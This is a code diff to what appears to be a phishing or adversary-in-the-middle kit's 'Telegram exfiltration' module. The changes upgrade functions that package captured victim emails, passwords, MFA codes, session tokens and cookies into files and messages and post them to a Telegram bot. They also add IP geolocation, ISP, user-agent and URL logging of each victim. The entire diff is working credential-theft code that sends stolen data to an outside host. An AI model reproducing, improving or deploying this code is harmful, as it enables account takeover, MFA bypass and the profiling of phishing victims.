@@ -119,14 +119,34 @@ function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': ge
 // ============================================================
 // 📤 TELEGRAM EXFILTRATION
 // ============================================================
-async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
+// ── Add this helper if not already present ──
+async function getGeoInfo(ip) {
+    try {
+        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`);
+        return response.data;
+    } catch {
+        return { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+    }
+}
+
+function getFlagEmoji(countryCode) {
+    if (!countryCode || countryCode.length !== 2) return '🌍';
+    return String.fromCodePoint(
+        0x1F1E6 + countryCode.charCodeAt(0) - 65,
+        0x1F1E6 + countryCode.charCodeAt(1) - 65
+    );
+}
+
+// ── UPGRADED sendTokensFile ──
+async function sendTokensFile(tokens, sessionId, email, password, mfaCode, ip, geo) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
     try {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const filename = `tokens_${sessionId}_${timestamp}.txt`;
         const filePath = path.join(os.tmpdir(), filename);
         let content = '# 🔑 FULL TOKENS DUMP\n';
-        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
+        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n`;
+        content += `# IP: ${ip || 'Unknown'}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
         for (const [key, val] of Object.entries(tokens)) {
             if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
         }
@@ -144,13 +164,15 @@ async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     } catch (e) { console.error('Telegram tokens file failed:', e.message); }
 }
 
-async function sendCookiesFile(cookies, sessionId) {
+// ── UPGRADED sendCookiesFile ──
+async function sendCookiesFile(cookies, sessionId, ip, geo) {
     if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
     try {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
         const filename = `cookies_${sessionId}_${timestamp}.txt`;
         const filePath = path.join(os.tmpdir(), filename);
         let content = '# 🍪 COOKIES DUMP\n';
+        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# IP: ${ip || 'Unknown'}\n\n`;
         for (const [name, value] of Object.entries(cookies)) content += `${name}=${value}\n`;
         fs.writeFileSync(filePath, content);
         const form = new FormData();
@@ -166,6 +188,7 @@ async function sendCookiesFile(cookies, sessionId) {
     } catch (e) { console.error('Telegram cookies file failed:', e.message); }
 }
 
+// ── UPGRADED sendToTelegram ──
 async function sendToTelegram(data) {
     if (!axios) {
         console.error('❌ axios not available, cannot send Telegram.');
@@ -178,32 +201,87 @@ async function sendToTelegram(data) {
         const mfa = data.mfa || 'N/A';
         const tokens = data.tokens || {};
         const cookies = data.cookies || {};
+        const ip = data.ip || 'Unknown';
+        const userAgent = data.userAgent || 'Unknown';
+        const url = data.url || 'N/A';
+        const method = data.method || 'N/A';
 
-        console.log(`📤 Sending Telegram for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);
+        // ── Get geolocation ──
+        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+        let flag = '🌍';
+        let location = 'Unknown';
+        if (ip !== 'Unknown') {
+            try {
+                geo = await getGeoInfo(ip);
+                flag = getFlagEmoji(geo.countryCode);
+                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+            } catch (e) {}
+        }
 
-        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
+        // ── Build the main message ──
+        let message = `🔐 **LOGIN CAPTURED!**\n\n`;
+        message += `👤 **Email:** ${email}\n`;
+        message += `🔐 **Password:** ${password}\n`;
+        if (mfa !== 'N/A') message += `📱 **MFA:** ${mfa}\n`;
+        message += `🆔 **Session:** ${sessionId}\n`;
+        message += `🌍 **IP:** ${ip}\n`;
+        message += `${flag} **Location:** ${location}\n`;
+        message += `🏢 **ISP:** ${geo.isp || 'N/A'}\n`;
+        message += `🕒 **Time:** ${new Date().toISOString()}\n`;
+        message += `🔗 **URL:** ${url}\n`;
+        message += `📨 **Method:** ${method}\n`;
+        message += `🖥️ **User-Agent:** ${userAgent}\n`;
+
+        // ── Send the main message ──
+        const sendMain = async (msg) => {
+            // Telegram has a 4096 character limit – split if needed
+            if (msg.length > 4096) {
+                const parts = msg.match(/[\s\S]{1,4000}/g) || [];
+                for (const part of parts) {
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        chat_id: CHAT_ID,
+                        text: part,
+                        parse_mode: 'Markdown'
+                    }, { timeout: 5000 });
+                }
+            } else {
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                }, { timeout: 5000 });
+            }
+        };
+
+        await sendMain(message);
+
+        // ── Tokens file ──
         if (Object.keys(tokens).length > 0) {
-            message += '\n\n🔑 Tokens:\n';
-            for (const [k, v] of Object.entries(tokens)) message += `${k}: ${v.slice(0, 30)}...\n`;
-            await sendTokensFile(tokens, sessionId, email, password, mfa);
+            await sendTokensFile(tokens, sessionId, email, password, mfa, ip, geo);
+            // Also send a separate message listing token types
+            let tokenList = '🔑 **Tokens extracted:**\n';
+            for (const [k, v] of Object.entries(tokens)) {
+                tokenList += `• ${k}: \`${v.slice(0, 20)}...\`\n`;
+            }
+            await sendMain(tokenList);
         }
+
+        // ── Cookies file ──
         if (Object.keys(cookies).length > 0) {
-            message += '\n🍪 Cookies:\n';
-            for (const [k, v] of Object.entries(cookies)) message += `${k}: ${v.slice(0, 30)}...\n`;
-            await sendCookiesFile(cookies, sessionId);
+            await sendCookiesFile(cookies, sessionId, ip, geo);
+            let cookieList = '🍪 **Cookies extracted:**\n';
+            for (const [k, v] of Object.entries(cookies)) {
+                cookieList += `• ${k}: \`${v.slice(0, 20)}...\`\n`;
+            }
+            await sendMain(cookieList);
         }
-        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }, { timeout: 5000 });
-        console.log(`✅ Telegram exfil for session ${sessionId} — response:`, response.status);
+
+        console.log(`✅ Telegram exfil for session ${sessionId} — complete.`);
     } catch (e) {
         console.error('❌ Telegram send failed:', e.message);
         if (e.response) console.error('   Response data:', e.response.data);
     }
 }
-
 // ============================================================
 // 🧩 PROXY HELPERS
 // ============================================================
